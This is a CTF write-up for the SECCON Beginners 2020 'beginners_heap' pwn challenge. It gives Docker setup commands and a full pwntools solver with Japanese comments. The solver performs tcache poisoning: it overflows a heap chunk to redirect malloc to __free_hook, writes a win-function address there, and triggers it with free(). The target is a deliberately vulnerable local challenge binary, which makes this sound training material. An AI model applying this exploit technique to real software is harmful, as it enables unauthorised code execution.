# Heap exploitation examples in CTF

## ctf4b2020/pwn/beginners_heap

### References

- https://github.com/SECCON/Beginners_CTF_2020/tree/master/pwn/beginners_heap
- https://qiita.com/claustra01/items/7c9ad0bfd69f3ccdb852
- https://qiita.com/hanya1995/items/c29a89737bbd521e67f2
- https://www.youtube.com/watch?v=Lpeh8yN7NAg&t=8582s

### Docker environment

#### Start

```zsh
docker compose up -d
```

#### Debug

```zsh
docker exec -it bheap ldd chall
        linux-vdso.so.1 (0x00007ffcf1577000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fc5c2ec6000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc5c2ad5000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fc5c32ce000)

docker exec -it bheap ls -l /lib/x86_64-linux-gnu/libdl.so.2
lrwxrwxrwx 1 root root 13 May  3  2022 /lib/x86_64-linux-gnu/libdl.so.2 -> libdl-2.27.so

docker cp bheap:/lib/x86_64-linux-gnu/libdl-2.27.so .

ln -s libdl-2.27.so libdl.so.2

docker exec -it bheap ls -l /lib/x86_64-linux-gnu/libc.so.6
lrwxrwxrwx 1 root root 12 May  3  2022 /lib/x86_64-linux-gnu/libc.so.6 -> libc-2.27.so

docker cp bheap:/lib/x86_64-linux-gnu/libc-2.27.so .
Successfully copied 2.03MB to /home/yutaka/CTF/ctf4b2020/pwn/beginners_heap/my_solver/.

ln -s libc-2.27.so libc.so.6 

docker exec -it bheap ls -l /lib64/ld-linux-x86-64.so.2
lrwxrwxrwx 1 root root 32 May  3  2022 /lib64/ld-linux-x86-64.so.2 -> /lib/x86_64-linux-gnu/ld-2.27.so

docker cp bheap:/lib/x86_64-linux-gnu/ld-2.27.so .

docker cp bheap:/home/pwn/chall .

docker cp bheap:/home/pwn/flag .

ll
total 2.2M
-r-xr-x--- 1 XXXXXX XXXXXX  18K Sep 27  2025 chall
-r--r----- 1 XXXXXX XXXXXX   39 Sep 27  2025 flag
-rwxr-xr-x 1 XXXXXX XXXXXX 175K May  3  2022 ld-2.27.so
-rwxr-xr-x 1 XXXXXX XXXXXX 2.0M May  3  2022 libc-2.27.so
lrwxrwxrwx 1 XXXXXX XXXXXX   12 Jul 27 16:05 libc.so.6 -> libc-2.27.so
-rw-r--r-- 1 XXXXXX XXXXXX  15K May  3  2022 libdl-2.27.so
lrwxrwxrwx 1 XXXXXX XXXXXX   13 Jul 27 16:13 libdl.so.2 -> libdl-2.27.so
-rwxr-xr-x 1 XXXXXX XXXXXX 2.4K Jul 27 18:20 solver.py

./solver.py GDB NOASLR
```

#### End

```zsh
docker compose down --rmi all
```

### Solution

```python
#!/usr/bin/env python3
from pwn import ELF, args, context, p64, process, remote, log
import pwnlib
context.log_level = "debug"
exe = context.binary = ELF("./chall")
libc = ELF("./libc-2.27.so")
ld_path = "./ld-2.27.so"
env = {"LD_LIBRARY_PATH": "."}
if args.GDB:
    io = pwnlib.gdb.debug([ld_path, exe.path], env=env,
                          gdbscript="c")
elif args.REMOTE:
    io = remote("::1", 9002)
else:
    io = process([ld_path, exe.path], env=env)
# ----------------------------------------
# <__free_hook>: 0x7f49442e28e8
io.recvuntil(b"<__free_hook>: ")
free_hook_addr = int(io.recvline(drop=True), 16)
log.info("&__free_hook: 0x%x", free_hook_addr)
# <win>: 0x7f49444eb465
io.recvuntil(b"<win>: ")
win_addr = int(io.recvline(drop=True), 16)
log.info("&win_addr: 0x%x", win_addr)
# ----------------------------------------
# 1. B に割り当てたヒープを free して、tcache に管理させる。
io.sendlineafter(b"> ", b"2")  # B = malloc(0x18); read(0, B, 0x18);
io.sendline(b"Hello")
io.sendlineafter(b"> ", b"3")  # free(B); B = NULL;
# ----------------------------------------
# 2. A に存在する Heap Overflow を利用して、
#    B に割り当てられていたメモリに `__free_hook` のアドレスを書き込む。
io.sendlineafter(b"> ", b"1")  # read(0, A, 0x80);
io.sendline(b"A"*0x18 +  # data of A
            p64(0xf1) +  # size (free 時に 0x20 tcache 以外にリンクさせる)
            p64(free_hook_addr))  # next
# ----------------------------------------
# 3. B の2回目の malloc 時に `__free_hook` にポインターが指されるので、
#    win のアドレスを書き込む。
io.sendlineafter(b"> ", b"2")  # B = malloc(0x18); read(0, B, 0x18);
io.sendline(b"Hello")
io.sendlineafter(b"> ", b"3")  # free(B); B = NULL;
io.sendlineafter(b"> ", b"2")  # B = malloc(0x18); read(0, B, 0x18);
io.sendline(p64(win_addr))
# ----------------------------------------
io.sendlineafter(b"> ", b"4")  # 4. Describe heap
io.sendlineafter(b"> ", b"5")  # 5. Describe tcache (for size 0x20)
io.sendlineafter(b"> ", b"6")  # 6. Currently available hint
# ----------------------------------------
# 4. free() (トリガー) を呼んで、win に飛ぶ。
io.sendlineafter(b"> ", b"3")  # free(B); B = NULL;
# ----------------------------------------
io.stream()
```
